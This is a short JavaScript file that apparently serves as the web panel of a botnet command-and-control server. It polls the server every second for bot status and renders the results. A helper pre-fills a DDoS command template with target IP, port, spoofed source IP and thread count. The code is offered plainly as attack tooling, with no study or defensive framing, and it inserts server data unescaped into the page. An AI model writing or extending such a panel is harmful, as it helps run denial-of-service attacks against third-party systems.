let serverURL = null;

function saveServerUrl() {
    serverURL = document.getElementById('serverUrl').value;
}

function parseBotnets(botnets) {
    for (let i = 0; i < botnets.length; i++) {
        botnets[i] = JSON.parse(botnets[i]);
    }
    return botnets
}

function getBotnets() {
    if (!serverURL || serverURL === '')
        return;
        
    const xhr = new XMLHttpRequest();
    xhr.open('GET', `${serverURL}/botnets`);
    xhr.onload = () => {
        const botnets = parseBotnets(JSON.parse(xhr.responseText));
        renderBotnets(botnets)
    }
    xhr.send();
}

function renderBotnets(botnets) {
    const botnetContainer = document.getElementsByClassName('botnet-activity')[0];
    // Delete children
    botnetContainer.innerHTML = '';

    // Render botnets
    for (const botnet of botnets) {
        botnetContainer.insertAdjacentHTML('beforeend', `
            <div class="botnet">
                <b>${botnet.uuid}</b>
                <p>${botnet.count} - ${botnet.last_seen}</p>
            </div>
        `)
    }
}

function fillCommandDDoS() {
    const textarea = document.getElementById('command');
    textarea.innerText = `{\\\n
        "type": "ddos",
        "target_ip": "",
        "target_port": 80,
        "fake_ip": "",
        "nb_threads": 5
    }`
}

window.addEventListener('load', function() {
    this.setInterval(getBotnets, 1000);
})